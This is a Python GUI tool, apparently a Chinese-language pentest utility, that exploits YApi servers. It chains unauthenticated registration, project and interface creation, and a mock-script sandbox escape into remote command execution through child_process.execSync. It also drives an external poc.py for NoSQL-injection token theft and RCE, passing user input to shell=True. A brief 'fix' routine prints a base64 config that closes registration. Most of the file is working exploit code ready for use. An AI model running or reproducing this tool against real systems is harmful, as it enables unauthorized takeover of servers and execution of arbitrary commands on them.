#/usr/local/bin/python3.9
import tkinter as tk
from tkinter import ttk
from tkinter import filedialog
import string
import random
import requests
import subprocess

python_global_path = "/usr/local/bin/python3.9"

REGISTER_API = "/api/user/reg"
LOGIN_API = "/api/user/login"
ADD_PROJECT_API = "/api/project/add"
GET_MYGROUP_ID="/api/group/get_mygroup"
INTERFACE_ADD_API="/api/interface/add"
PROJECT_GET_API="/api/project/get?id="
ADD_API_API="/api/interface/add"
ADV_MOCK_API="/api/plugin/advmock/save"

# 生成随机字符串
def generate_random_string(length=8):
    """生成指定长度的随机字符串，包含字母和数字"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# 生成随机邮箱
def generate_random_email(domain="example.com"):
    """生成随机邮箱"""
    username = generate_random_string(8)
    return f"{username}@{domain}"

# 生成随机密码
def generate_random_password(length=12):
    """生成随机密码，包含大写字母、小写字母和数字"""
    characters = string.ascii_uppercase + string.ascii_lowercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# 生成随机用户名
def generate_random_username():
    """生成随机用户名"""
    return generate_random_string(6)


class YapiGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("YAPI工具")
        self.root.geometry("1024x768")
        
        # 创建主框架
        self.main_frame = tk.Frame(root)
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # 上部区域
        self.create_top_section()
        
        # 中部区域
        self.create_middle_section()
        
        # 下部区域
        self.create_bottom_section()
    
    def create_top_section(self):
        top_frame = tk.Frame(self.main_frame)
        top_frame.pack(fill=tk.X, pady=10)
        
        # URL标签和文本框
        url_label = tk.Label(top_frame, text="URL:")
        url_label.pack(side=tk.LEFT, padx=5)
        
        self.url_entry = tk.Entry(top_frame, width=50)
        self.url_entry.pack(side=tk.LEFT, padx=5)
        
        
        
        # 下拉列表
        exploit_type_label = tk.Label(top_frame, text="漏洞类型:")
        exploit_type_label.pack(side=tk.LEFT, padx=5)
        
        self.exploit_type = tk.StringVar()
        exploit_combobox = ttk.Combobox(top_frame, textvariable=self.exploit_type, values=["unacc注册开放", "nosql注入"])
        exploit_combobox.pack(side=tk.LEFT, padx=5)
        exploit_combobox.current(0)
        # 开始按钮
        start_button = tk.Button(top_frame, text="开始", command=self.start_exploit)
        start_button.pack(side=tk.LEFT, padx=5)
        # 修复按钮
        fix_button = tk.Button(top_frame, text="修复", command=self.fix_exploit)
        fix_button.pack(side=tk.LEFT, padx=5)
    
    def create_middle_section(self):
        middle_frame = tk.Frame(self.main_frame)
        middle_frame.pack(fill=tk.X, pady=10)
        
        # 第一行：邮箱、用户名、密码
        row1_frame = tk.Frame(middle_frame)
        row1_frame.pack(fill=tk.X, pady=5)
        
        # 邮箱标签和文本框
        email_label = tk.Label(row1_frame, text="邮箱:")
        email_label.pack(side=tk.LEFT, padx=5)
        
        self.email_entry = tk.Entry(row1_frame, width=30)
        self.email_entry.pack(side=tk.LEFT, padx=5)
        
        # 用户名标签和文本框
        username_label = tk.Label(row1_frame, text="用户名:")
        username_label.pack(side=tk.LEFT, padx=5)
        
        self.username_entry = tk.Entry(row1_frame, width=20)
        self.username_entry.pack(side=tk.LEFT, padx=5)
        
        # 密码标签和文本框
        password_label = tk.Label(row1_frame, text="密码:")
        password_label.pack(side=tk.LEFT, padx=5)
        
        self.password_entry = tk.Entry(row1_frame, width=20)
        self.password_entry.pack(side=tk.LEFT, padx=5)
        
        # 第二行：Cookie
        row2_frame = tk.Frame(middle_frame)
        row2_frame.pack(fill=tk.X, pady=5)
        
        # Cookie标签
        cookie_label = tk.Label(row2_frame, text="Cookie:")
        cookie_label.pack(anchor=tk.W, padx=5, pady=2)
        
        # Cookie多行文本框和滚动条
        cookie_text_frame = tk.Frame(row2_frame)
        cookie_text_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=2)
        
        self.cookie_entry = tk.Text(cookie_text_frame, width=80, height=3)
        self.cookie_entry.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # 添加垂直滚动条
        cookie_scrollbar = tk.Scrollbar(cookie_text_frame, command=self.cookie_entry.yview)
        cookie_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.cookie_entry.config(yscrollcommand=cookie_scrollbar.set)

        # 第三行：信息
        row3_frame = tk.Frame(middle_frame)
        row3_frame.pack(fill=tk.X, pady=5)
         # 项目ID标签和文本框
        project_id_label = tk.Label(row3_frame, text="项目ID:")
        project_id_label.pack(side=tk.LEFT, padx=5)
        
        self.project_id_entry = tk.Entry(row3_frame, width=20)
        self.project_id_entry.pack(side=tk.LEFT, padx=5)

        api_id_label = tk.Label(row3_frame, text="接口ID:")
        api_id_label.pack(side=tk.LEFT, padx=5)
        
        self.api_id_entry = tk.Entry(row3_frame, width=20)
        self.api_id_entry.pack(side=tk.LEFT, padx=5)
        
        path_name_label = tk.Label(row3_frame, text="路径名称:")
        path_name_label.pack(side=tk.LEFT, padx=5)
        
        self.path_name_entry = tk.Entry(row3_frame, width=20)
        self.path_name_entry.pack(side=tk.LEFT, padx=5)
        # 第四行：注入类型
        row4_frame = tk.Frame(middle_frame)
        row4_frame.pack(fill=tk.X, pady=5)
        # ID标签和文本框
        # hit: project_id: 66 | owner_id: 11 | col_id: 66 | token: 1cae15606ea4b223b01a
        owner_id_label = tk.Label(row4_frame, text="owner_id:")
        owner_id_label.pack(side=tk.LEFT, padx=5)
        
        self.owner_id_entry = tk.Entry(row4_frame, width=20)
        self.owner_id_entry.pack(side=tk.LEFT, padx=5)
        
        col_id_label = tk.Label(row4_frame, text="col_id:")
        col_id_label.pack(side=tk.LEFT, padx=5)
        
        self.col_id_entry = tk.Entry(row4_frame, width=20)
        self.col_id_entry.pack(side=tk.LEFT, padx=5)
        
        token_label = tk.Label(row4_frame, text="token:")
        token_label.pack(side=tk.LEFT, padx=5)
        
        self.token_entry = tk.Entry(row4_frame, width=20)
        self.token_entry.pack(side=tk.LEFT, padx=5)

    
    def create_bottom_section(self):
        bottom_frame = tk.Frame(self.main_frame)
        bottom_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # 创建标签页控件
        notebook = ttk.Notebook(bottom_frame)
        notebook.pack(fill=tk.BOTH, expand=True)
        
        # 命令执行标签页
        cmd_tab = tk.Frame(notebook)
        notebook.add(cmd_tab, text="命令执行")
        self.create_cmd_tab(cmd_tab)
        
        # 文件上传标签页
        upload_tab = tk.Frame(notebook)
        notebook.add(upload_tab, text="文件上传")
        self.create_upload_tab(upload_tab)
    
    def create_cmd_tab(self, parent):
        # 命令行框架（包含标签、输入框和执行按钮）
        cmd_frame = tk.Frame(parent)
        cmd_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # 命令输入标签
        cmd_label = tk.Label(cmd_frame, text="命令:")
        cmd_label.pack(side=tk.LEFT, padx=5, pady=5)
        
        # 命令输入文本框
        self.cmd_entry = tk.Entry(cmd_frame, width=60)
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5, pady=5)
        
        # 执行按钮
        execute_button = tk.Button(cmd_frame, text="执行", command=self.execute_command)
        execute_button.pack(side=tk.LEFT, padx=5, pady=5)
        
        # 结果输出标签
        result_label = tk.Label(parent, text="结果:")
        result_label.pack(anchor=tk.W, padx=5, pady=5)
        
        # 结果输出文本框
        self.result_text = tk.Text(parent, height=20, width=100)
        self.result_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # 添加滚动条
        scrollbar = tk.Scrollbar(self.result_text)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.result_text.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=self.result_text.yview)
    
    def create_upload_tab(self, parent):
        # 文件上传框架（包含标签、输入框、浏览和上传按钮）
        upload_frame = tk.Frame(parent)
        upload_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # 文件路径标签
        file_path_label = tk.Label(upload_frame, text="文件路径:")
        file_path_label.pack(side=tk.LEFT, padx=5, pady=5)
        
        # 文件路径输入框
        self.file_path_entry = tk.Entry(upload_frame, width=60)
        self.file_path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5, pady=5)
        
        # 浏览按钮
        browse_button = tk.Button(upload_frame, text="浏览", command=self.browse_file)
        browse_button.pack(side=tk.LEFT, padx=5, pady=5)
        
        # 上传按钮
        upload_button = tk.Button(upload_frame, text="上传")
        upload_button.pack(side=tk.LEFT, padx=5, pady=5)
        

        
        # 结果输出标签和文本框
        upload_result_label = tk.Label(parent, text="结果:")
        upload_result_label.pack(anchor=tk.W, padx=5, pady=5)
        
        self.upload_result_text = tk.Text(parent, height=20, width=100)
        self.upload_result_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # 添加滚动条
        scrollbar = tk.Scrollbar(self.upload_result_text)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.upload_result_text.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=self.upload_result_text.yview)
    
    def browse_file(self):
        file_path = filedialog.askopenfilename()
        self.file_path_entry.delete(0, tk.END)
        self.file_path_entry.insert(0, file_path)

    def execute_command(self):
        """执行命令"""
        cmd = self.cmd_entry.get()
        if not cmd:
            self.result_text.insert(tk.END, "请输入命令\n")
            return
        # 获取漏洞类型
        exploit_type = self.exploit_type.get()
        if exploit_type == "unacc注册开放":
            target_url = self.url_entry.get()
            project_id = self.project_id_entry.get()
            api_id = self.api_id_entry.get()
            path_name = self.path_name_entry.get()
            headers = {
                        "Cookie": self.cookie_entry.get(1.0, tk.END).strip()
                    }
            
            self.mock_api(target_url,project_id, api_id,path_name,headers,cmd)
        elif exploit_type == "nosql注入":
            try:
                target_url = self.url_entry.get()
                if not target_url:
                    self.result_text.insert(tk.END, "错误: 请输入目标URL\n")
                    return
                # 构建命令
                commad = f"{python_global_path} poc.py rce -u {target_url} -t {self.token_entry.get()} -o {self.owner_id_entry.get()} --pid {self.project_id_entry.get()} --cid {self.col_id_entry.get()} --command=\"{cmd}\""
                # print(commad)
                # 执行命令并捕获输出
                result = subprocess.run(commad, shell=True, capture_output=True, text=True)
                # 将结果输出到文本框
                if result.stdout:
                    self.result_text.insert(tk.END, f"返回信息:\n{result.stdout}\n")
                if result.stderr:
                    self.result_text.insert(tk.END, f"错误信息:\n{result.stderr}\n")
            except Exception as e:
                self.result_text.insert(tk.END, f"执行命令时出错: {str(e)}\n")
        else:
            self.result_text.insert(tk.END, "请选择有效的漏洞类型\n")

    def mock_api(self, target_url,project_id, api_id,path_name,headers,cmd):
        """模拟接口"""
        data = {
            "project_id":project_id,
            "interface_id":api_id,
            "mock_script":f"const sandbox = this\nconst ObjectConstructor = this.constructor\nconst FunctionConstructor = ObjectConstructor.constructor\nconst myfun = FunctionConstructor('return process')\nconst process = myfun()\nmockJson = process.mainModule.require(\"child_process\").execSync(\"{cmd}\").toString()",
            "enable":True
        }
        response = requests.post(target_url+ADV_MOCK_API, headers=headers, json=data)
        # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
        # self.result_text.insert(tk.END, f"响应内容: {response.text}\n")
        # self.result_text.insert(tk.END, f"模拟接口成功：{api_id}\n")
        uri = f"/mock/{project_id}/{path_name}"
        response = requests.get(target_url+uri, headers=headers)
        # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
        self.result_text.insert(tk.END, f"响应内容: {response.text}\n")


    def start_exploit(self):
        # 获取漏洞类型
        exploit_type = self.exploit_type.get()
        # 清空结果文本框
        self.result_text.delete(1.0, tk.END)
        
        # 根据漏洞类型执行不同的操作
        if exploit_type == "unacc注册开放":
            self.result_text.insert(tk.END, "执行未授权注册漏洞利用...\n")
            #生成随机用户名、邮箱和密码
            username = generate_random_username()
            email = generate_random_email()
            password = generate_random_password()
            
            # 显示生成的信息
            self.username_entry.delete(0, tk.END)
            self.username_entry.insert(tk.END, username)
            self.email_entry.delete(0, tk.END)
            self.email_entry.insert(tk.END, email)
            self.password_entry.delete(0, tk.END)
            self.password_entry.insert(tk.END, password)
            data = {
                "username": username,
                "email": email,
                "password": password
            }
            try:
                target_url = self.url_entry.get()
                if not target_url:
                    self.result_text.insert(tk.END, "错误: 请输入目标URL")
                    return
                response = requests.post(target_url+REGISTER_API, json=data)
                # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
                # self.result_text.insert(tk.END, f"响应内容: {response.text}\n")
                errcode = response.json()['errcode']
                print(errcode)
                print(type(errcode))
                if errcode == 400:
                    self.result_text.insert(tk.END, f"注册失败，错误码：{errcode}，错误信息：{response.json()['errmsg']}\n")
                    self.result_text.insert(tk.END, f"不存在未授权注册漏洞！\n")
                    return
                else:
                    
                    # self.result_text.insert(tk.END, f"获取到的Cookie: {response.cookies.get_dict()}\n")
                    # 清空Cookie多行文本框（注意：Text组件使用1.0作为起始索引）
                    self.cookie_entry.delete(1.0, tk.END)
                    # 将Cookie字典转换为标准格式（key=value; key=value）
                    cookie_dict = response.cookies.get_dict()
                    cookie_str = '; '.join([f"{key}={value}" for key, value in cookie_dict.items()])
                    self.cookie_entry.insert(tk.END, cookie_str)
                    self.result_text.insert(tk.END, f"注册成功，用户名：{username}，邮箱：{email}，密码：{password}\n")
                    headers = {
                        "Cookie": self.cookie_entry.get(1.0, tk.END).strip()
                    }
                    response = requests.get(target_url+GET_MYGROUP_ID, headers=headers)
                    # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
                    # self.result_text.insert(tk.END, f"响应内容: {response.text}\n")
                    group_id = response.json()['data']['_id']
                    # self.result_text.insert(tk.END, f"获取到的GroupID: {group_id}\n")
                    # # 将GroupID作为新的cookie条目添加到cookie_entry中
                    # self.cookie_entry.insert(tk.END, f"; _id={group_id}")
                    # headers = {
                    #     "Cookie": self.cookie_entry.get(1.0, tk.END).strip()
                    # }
                    project_name = generate_random_string(6)
                    data = {
                        "name":project_name,
                        "group_id":str(group_id),
                        "icon":"code-o",
                        "color":"purple",
                        "project_type":"private"
                    }
                    response = requests.post(target_url+ADD_PROJECT_API, headers=headers, json=data)
                    print(headers,data)
                    # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
                    # self.result_text.insert(tk.END, f"响应内容: {response.text}\n")
                    # self.result_text.insert(tk.END, f"创建项目成功：{project_name}\n")
                    project_id = response.json()['data']['_id']
                    # self.result_text.insert(tk.END, f"获取到的ProjectID: {project_id}\n")
                    response = requests.get(target_url+PROJECT_GET_API+str(project_id), headers=headers)
                    # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
                    # self.result_text.insert(tk.END, f"响应内容: {response.text}\n")
                    cat_id = response.json()['data']['cat'][0]['_id']
                    # self.result_text.insert(tk.END, f"获取到的CatID: {cat_id}\n")
                    title_name = generate_random_string(6)
                    path_name = generate_random_string(6)
                    data = {
                        "project_id":project_id,
                        "catid":cat_id,
                        "title":title_name,
                        "path":"/"+path_name,
                        "method":"GET"

                    }
                    response = requests.post(target_url+ADD_API_API, headers=headers, json=data)
                    # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
                    # self.result_text.insert(tk.END, f"响应内容: {response.text}\n")
                    # self.result_text.insert(tk.END, f"创建接口成功：{title_name}\n")
                    api_id = response.json()['data']['_id']
                    # self.result_text.insert(tk.END, f"获取到的APIID: {api_id}\n")
                    # self.result_text.insert(tk.END, f"获取到的接口标题: {title_name}\n")
                    # self.result_text.insert(tk.END, f"获取到的接口路径: {path_name}\n")
                    # self.result_text.insert(tk.END, f"获取到的接口方法: {data['method']}\n")
                    self.project_id_entry.insert(tk.END, project_id)
                    self.api_id_entry.insert(tk.END, api_id)
                    self.path_name_entry.insert(tk.END, path_name)
                    target_url=target_url
                    project_id=project_id
                    api_id=api_id
                    path_name=path_name
                    headers=headers
                    self.mock_api(target_url,project_id, api_id,path_name,headers,"id;uname -a;pwd")


                

            except requests.RequestException as e:
                self.result_text.insert(tk.END, f"请求错误: {e}\n")
            
        elif exploit_type == "nosql注入":
            self.result_text.insert(tk.END, "执行NoSQL注入漏洞利用...\n")
            try:
                target_url = self.url_entry.get()
                if not target_url:
                    self.result_text.insert(tk.END, "错误: 请输入目标URL\n")
                    return
                # 构建命令
                cmd = f"{python_global_path} poc.py --debug one4all -u {target_url}"

                # 执行命令并捕获输出
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if "no new token found, exit..." in result.stdout:
                    self.result_text.insert(tk.END, f"不存在漏洞\n")
                    return
                else:
                    # 将结果输出到文本框
                    self.result_text.insert(tk.END, f"命令输出:\n{result.stdout}\n")
                    # print(result.stdout)
                    # 提取project_id、owner_id、col_id和token
                    import re
                    output = result.stdout
                    match = re.search(r'hit: project_id: (\d+) \| owner_id: (\d+) \| col_id: (\d+) \| token: ([\w]+)', output)
                    # print(match)
                    if match:
                        project_id = match.group(1)
                        owner_id = match.group(2)
                        col_id = match.group(3)
                        token = match.group(4)
                        # 填充到对应的文本框
                        self.project_id_entry.delete(0, tk.END)
                        self.project_id_entry.insert(0, project_id)
                        self.owner_id_entry.delete(0, tk.END)
                        self.owner_id_entry.insert(0, owner_id)
                        self.col_id_entry.delete(0, tk.END)
                        self.col_id_entry.insert(0, col_id)
                        self.token_entry.delete(0, tk.END)
                        self.token_entry.insert(0, token)
                    self.result_text.insert(tk.END, f"命令输出:\n{result.stdout}\n")
                if result.stderr:
                    self.result_text.insert(tk.END, f"错误信息:\n{result.stderr}\n")
            except Exception as e:
                self.result_text.insert(tk.END, f"执行命令时出错: {str(e)}\n")
            
        else:
            self.result_text.insert(tk.END, "请选择有效的漏洞类型\n")

    def fix_exploit(self):
        # 获取漏洞类型
        exploit_type = self.exploit_type.get()
        if exploit_type == "unacc注册开放":
            self.result_text.insert(tk.END, "修复漏洞说明\n")
            unacc = "cat ../config.json\n一般在上一层\n添加\"closeRegister\":true\n用命令执行\necho \"ewogICAgInBvcnQiOiAiMzAwMCIsCiAgICAiYWRtaW5BY2NvdW50IjogImFkbWluQGFkbWluLmNvbSIsCiAgICAidGltZW91dCI6MTIwMDAwLAogICAgImRiIjogewogICAgICAgICJzZXJ2ZXJuYW1lIjogIm1vbmdvIiwKICAgICAgICAiREFUQUJBU0UiOiAieWFwaSIsCiAgICAgICAgInBvcnQiOiAyNzAxNywKICAgICAgICAidXNlciI6ICJyb290IiwKICAgICAgICAicGFzcyI6ICJyb290IiwKICAgICAgICAiYXV0aFNvdXJjZSI6ICJhZG1pbiIKICAgIH0sCiAgICAibWFpbCI6IHsKICAgICAgICAiZW5hYmxlIjogdHJ1ZSwKICAgICAgICAiaG9zdCI6ICJzbXRwLjE2My5jb20iLAogICAgICAgICJwb3J0IjogNDY1LAogICAgICAgICJmcm9tIjogIioqKkAxNjMuY29tIiwKICAgICAgICAiYXV0aCI6IHsKICAgICAgICAgICAgInVzZXIiOiAiKioqQDE2My5jb20iLAogICAgICAgICAgICAicGFzcyI6ICIqKioqKiIKICAgICAgICB9CiAgICB9LAoJImNsb3NlUmVnaXN0ZXIiOiB0cnVlCn0=\" | base64 -d > ../config.json\nps -aux\nkill -9 进程号;node server/app.js"
            self.result_text.insert(tk.END, f"修复输出:\n{unacc}\n")
        elif exploit_type == "nosql注入":
            self.result_text.insert(tk.END, "修复漏洞说明\n")
            unacc = "未编写"
            self.result_text.insert(tk.END, f"修复输出:\n{unacc}\n")

if __name__ == "__main__":
    root = tk.Tk()
    app = YapiGUI(root)
    root.mainloop()